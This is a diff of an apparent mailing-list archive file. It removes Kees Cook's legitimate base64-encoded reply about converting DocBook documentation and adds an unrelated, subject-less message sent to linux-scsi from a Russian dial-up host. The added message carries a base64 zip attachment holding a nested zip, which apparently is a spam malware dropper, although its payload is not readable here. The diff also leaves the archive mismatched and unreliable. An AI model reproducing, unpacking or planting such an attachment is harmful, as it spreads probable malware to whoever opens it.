@@ -1,62 +1,56 @@
-From: Kees Cook <keescook@chromium.org>
-Subject: Re: [PATCH 00/13] Get rid of DocBook
-Date: Mon, 15 May 2017 07:34:31 -0700
-Message-ID: <CAGXu5jJSv49uy98r3=7nRqeKyzZWDC=QbvFMoKPWjWUhbcDhTw@mail.gmail.com>
-References: <cover.1494775891.git.mchehab@s-opensource.com>
- <CAGXu5j+KgtD+Vj8-K-3XVKdQnWQ8JJUWSjWwrhxP+ApAyyEPKg@mail.gmail.com>
- <20170514190057.17e41167@vento.lan>
+From: <armiksanaye@gmail.com>
+Subject: (unknown)
+Date: Tue, 16 May 2017 03:06:39 -0000
+Message-ID: <149490399975.6152.15006475396807944994@mari-el.ru>
 Mime-Version: 1.0
-Content-Type: text/plain; charset="utf-8"
+Content-Type: application/zip; name="EMAIL_94744_linux-scsi.zip"
 Content-Transfer-Encoding: base64
-Return-path: <dri-devel-bounces@lists.freedesktop.org>
-In-Reply-To: <20170514190057.17e41167@vento.lan>
-List-Unsubscribe: <https://lists.freedesktop.org/mailman/options/dri-devel>,
- <mailto:dri-devel-request@lists.freedesktop.org?subject=unsubscribe>
-List-Archive: <https://lists.freedesktop.org/archives/dri-devel>
-List-Post: <mailto:dri-devel@lists.freedesktop.org>
-List-Help: <mailto:dri-devel-request@lists.freedesktop.org?subject=help>
-List-Subscribe: <https://lists.freedesktop.org/mailman/listinfo/dri-devel>,
- <mailto:dri-devel-request@lists.freedesktop.org?subject=subscribe>
-Errors-To: dri-devel-bounces@lists.freedesktop.org
-Sender: "dri-devel" <dri-devel-bounces@lists.freedesktop.org>
-To: Mauro Carvalho Chehab <mchehab@s-opensource.com>
-Cc: linux-ide@vger.kernel.org, linux-fbdev@vger.kernel.org, linux-ia64@vger.kernel.org, Linux Doc Mailing List <linux-doc@vger.kernel.org>, Peter Zijlstra <peterz@infradead.org>, "linux-pci@vger.kernel.org" <linux-pci@vger.kernel.org>, Richard Sailer <richard@weltraumpflege.org>, "Herton R. Krzesinski" <herton@redhat.com>, moderated for non-subscribers <alsa-devel@alsa-project.org>, Maling list - DRI developers <dri-devel@lists.freedesktop.org>, Jaroslav Kysela <perex@perex.cz>, Masahiro Yamada <yamada.masahiro@socionext.com>, Daniel Vetter <daniel.vetter@intel.com>, Jiri Slaby <jslaby@suse.cz>, Ingo Molnar <mingo@kernel.org>, Hans-Christian Noren Egtvedt <egtvedt@samfundet.no>, Markus Heiser <markus.heiser@darmarit.de>, "James E.J. Bottomley" <jejb@linux.vnet.ibm.com>, "linux-scsi@vger.kernel.org" <linux-scsi@vger.kernel.org>, Jonathan Corbet <corbet@lwn.net>Sanjeev <g>
+Return-path: <linux-scsi-owner@vger.kernel.org>
+Received: from 136.54.pppoe.mari-el.ru ([77.40.54.136]:44520 "HELO mari-el.ru"
+        rhost-flags-OK-FAIL-OK-FAIL) by vger.kernel.org with SMTP
+        id S1750713AbdEPDGn (ORCPT <rfc822;linux-scsi@vger.kernel.org>);
+        Mon, 15 May 2017 23:06:43 -0400
+Subject: 
+Content-Disposition: attachment
+Sender: linux-scsi-owner@vger.kernel.org
 List-Id: linux-scsi@vger.kernel.org
+To: linux-scsi@vger.kernel.org
 
-T24gU3VuLCBNYXkgMTQsIDIwMTcgYXQgMzowMCBQTSwgTWF1cm8gQ2FydmFsaG8gQ2hlaGFiCjxt
-Y2hlaGFiQHMtb3BlbnNvdXJjZS5jb20+IHdyb3RlOgo+IEVtIFN1biwgMTQgTWF5IDIwMTcgMTQ6
-MDU6MDkgLTA3MDAKPiBLZWVzIENvb2sgPGtlZXNjb29rQGNocm9taXVtLm9yZz4gZXNjcmV2ZXU6
-Cj4KPj4gT24gU3VuLCBNYXkgMTQsIDIwMTcgYXQgODozOCBBTSwgTWF1cm8gQ2FydmFsaG8gQ2hl
-aGFiCj4+IDxtY2hlaGFiQHMtb3BlbnNvdXJjZS5jb20+IHdyb3RlOgo+PiA+IEFzIGp1c3Qgb25l
-IGJvb2sgKGxzbSkgd2FzIG1pc3NpbmcgY29udmVyc2lvbiwgbGV0J3MgY29udmVydCBpdAo+PiA+
-IGFuZCBzdG9yZSBhcyBpZiBpdCB3ZXJlIGEgcGxhaW4gdGV4dCBmaWxlIHVuZGVyIERvY3VtZW50
-YXRpb24vbHNtLnR4dCwKPj4gPiBhZGRpbmcgYSBub3RpY2UgdGhhdCBpdCByZXF1aXJlcyB1cGRh
-dGUuCj4+Cj4+IEkgY291bGQgcHJvYmFibHkgZm9sZCB0aGlzIGNoYW5nZSBpbnRvIG15IHJzdC1p
-ZmljYXRpb24gb2YKPj4gRG9jdW1lbnRhdGlvbi9zZWN1cml0eS8KPj4KPj4gaHR0cHM6Ly9naXQu
-a2VybmVsLm9yZy9wdWIvc2NtL2xpbnV4L2tlcm5lbC9naXQva2Vlcy9saW51eC5naXQvbG9nLz9o
-PWtzcHAvcnN0Cj4+Cj4+IFNwZWNpZmljYWxseSwgdGhlIG5ldyBEb2N1bWVudGF0aW9uL3NlY3Vy
-aXR5L0xTTS5yc3Qgd2FzIHJhdGhlciBzaG9ydC4KPj4gSSB0aGluayB5b3VyIGxzbS50eHQgYW5k
-IHRoaXMgb25lIGNvdWxkIGJlIGxpa2VseSBtZXJnZWQuCj4KPiBZZWFoLCBtYWtlcyBzZW5zZS4g
-SSdtIG5vdCBzdXJlIHdoYXQgd291bGQgYmUgdGhlIGJlc3Qgd2F5IHRvCj4gcHJvY2VlZCwgYXMs
-IGN1cnJlbnRseSwgYWZ0ZXIgcmVtb3ZpbmcgbHNtLnRtcGwsIG15IHBhdGNoCj4gc2VyaWVzIHJl
-bW92ZSBEb2NCb29rLCBhcyBldmVyeXRoaW5nIGVsc2Ugd2FzIGFscmVhZHkgcmVtb3ZlZC4KPgo+
-IEkgc2VlIGEgZmV3IHdheXMgZm9yIHVzIHRvIHByb2NlZWQ6Cj4KPiAxKSBZb3UgY291bGQgc3Vi
-bWl0IHRoZSBwYXRjaGVzIHlvdSBoYXZlIHNvIGZhciB0byBkb2NzIC1uZXh0LAo+IHRvIGJlIG1l
-cmdlZCBiZWZvcmUgbXkgcGF0Y2ggc2VyaWVzOwoKSSBzZW50IG15IHNlcmllcyBhbHJlYWR5IChp
-dCBnb3QgQ0NlZCB0byBsaW51eC1kb2MpOyBpdCdzIGNvbGxlY3RlZCBhCmZldyBBY2tzIGFscmVh
-ZHkuIEknbSBub3Qgc3VyZSB3aGF0IHRoZSB0aW1pbmcgZm9yIHRoYXQgbWVhbnMsIHRob3VnaC4K
-Cj4gMikgSSBjb3VsZCBzZW5kIHlvdSBhIHBhdGNoIGJhc2VkIG9uIHlvdXIgdHJlZS4gSSdsbCBu
-ZWVkIHRvCj4gcmViYXNlIHRoaXMgc2VyaWVzIHRvIGJlIGFwcGxpZWQgb24gdGhlIHRvcCBvZiB5
-b3VyIHRyZWUgKyBkb2NzLW5leHQsCj4gd2l0aCB3b3VsZCByZXF1aXJlIHRoYXQgeW91ciBwYXRj
-aCBzZXJpZXMgd291bGQgYmUgbWVyZ2VkIGJlZm9yZSwKPiBhdCBkb2NzIC1uZXh0Owo+Cj4gMykg
-d2UgY2FuIGhhbmRsZSBib3RoIHNlcmllcyBpbmRlcGVuZGVudGx5LiBXaGVuIGJvdGggZ2V0cwo+
-IG1lcmdlZCBhdCBkb2NzIC1uZXh0LCBhIHNpbXBsZSBwYXRjaCwgZWl0aGVyIHdyaXR0ZW4gYnkg
-eW91IG9yCj4gbWUsIGNvdWxkIG1lcmdlIGJvdGggZmlsZXMuCgpJIGRvbid0IHNlZSBhIHJlYXNv
-biBmb3IgdXMgdG8gbWFrZSB0aGUgdHJlZXMgZGVwZW5kIG9uIGVhY2ggb3RoZXIuCkxldCdzIGp1
-c3QgcHJvY2VlZCBhcy1pcyBhbmQgd2hlbmV2ZXIgd2UncmUgaW4gYSBwb3NpdGlvbiB0byBtZXJn
-ZSB0aGUKTFNNIGRvY3MsIHdlIGNhbiBkbyB0aGF0LgoKPiBJTU8sICgzKSBpcyBzaW1wbGVyLCBi
-dXQgaWYgeW91IHByZWZlciwgd2UgY2FuIGRvIG9uIHNvbWUgb3RoZXIKPiB3YXkuCgpBZ3JlZWQu
-CgotS2VlcwoKLS0gCktlZXMgQ29vawpQaXhlbCBTZWN1cml0eQpfX19fX19fX19fX19fX19fX19f
-X19fX19fX19fX19fX19fX19fX19fX19fX19fXwpkcmktZGV2ZWwgbWFpbGluZyBsaXN0CmRyaS1k
-ZXZlbEBsaXN0cy5mcmVlZGVza3RvcC5vcmcKaHR0cHM6Ly9saXN0cy5mcmVlZGVza3RvcC5vcmcv
-bWFpbG1hbi9saXN0aW5mby9kcmktZGV2ZWwK
+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
+ANMHAAAAAA==
